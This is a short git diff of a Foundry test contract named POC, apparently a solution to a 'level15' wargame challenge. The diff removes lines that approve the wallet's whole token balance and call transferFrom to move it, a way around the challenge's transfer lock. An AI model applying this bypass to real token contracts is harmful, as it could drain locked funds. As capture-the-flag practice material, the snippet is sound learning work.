@@ -11,13 +11,8 @@ contract POC is Test {
     function test() external{
         vm.startBroadcast();
         address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
-        uint myBal = level15.balanceOf(myWallet);
-        console.log("Current balance is: ", myBal);
-
-        level15.approve(myWallet, myBal);
-        level15.transferFrom(myWallet, address(level15), myBal);
-
-        console.log("New balance is: ", level15.balanceOf(myWallet));
+        
+        
         vm.stopBroadcast();
     }
 }
